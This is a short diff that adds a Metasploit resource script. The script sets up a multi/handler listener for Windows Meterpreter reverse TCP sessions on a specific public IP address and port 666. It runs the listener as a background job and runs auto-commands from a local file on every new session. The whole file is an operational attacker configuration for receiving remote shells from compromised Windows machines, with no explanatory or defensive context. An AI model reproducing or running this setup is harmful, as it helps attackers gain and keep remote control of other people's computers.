@@ -1,0 +1,7 @@
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LPORT 666
+set LHOST 86.195.181.105
+set ExitOnSession false
+exploit -j -z
+set AutoRunScript multi_console_command -rc /root/tools/msf/autoruncommands.rc
